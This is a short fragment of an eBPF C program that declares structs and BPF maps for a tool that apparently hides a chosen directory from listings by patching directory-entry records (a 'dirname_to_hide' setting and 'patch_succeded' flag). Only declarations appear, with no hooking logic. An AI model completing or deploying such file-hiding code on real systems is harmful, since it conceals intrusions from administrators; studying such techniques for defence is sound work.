
#define MAX_NAME_LEN 100

// I believe no directory have more 10k entries
#define MAX_DIRENTS 10000

struct rb_event {
   int pid;
   bool overwrite_succed;
   u8 command[MAX_NAME_LEN];
};
const struct rb_event *rb_event_unused __attribute__((unused));

struct userspace_data {
   u8 dirname_to_hide[MAX_NAME_LEN];
   int dirname_len;
};
const struct userspace_data *userspace_data_unused __attribute__((unused));

struct dirents_data_t {
   u32 bpos;
   struct userspace_data * userspace_data;
   u64 * dirents_buf;
   long buff_size;
   u16 d_reclen;
   u16 d_reclen_prev;
   u16 d_reclen_new;
   bool patch_succeded;
};

struct {
   __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
   __type(key, u32);
   __type(value, u32);
} rb SEC(".maps");

struct {
   __uint(type, BPF_MAP_TYPE_HASH);
   __uint(max_entries, 10);
   __type(key, u32);
   __type(value, u64);
} map_dirent SEC(".maps");

struct {
   __uint(type, BPF_MAP_TYPE_ARRAY);
   __uint(max_entries, 1);
   __type(key, u32);
   __type(value, struct userspace_data);
} map_store_dirname SEC(".maps");
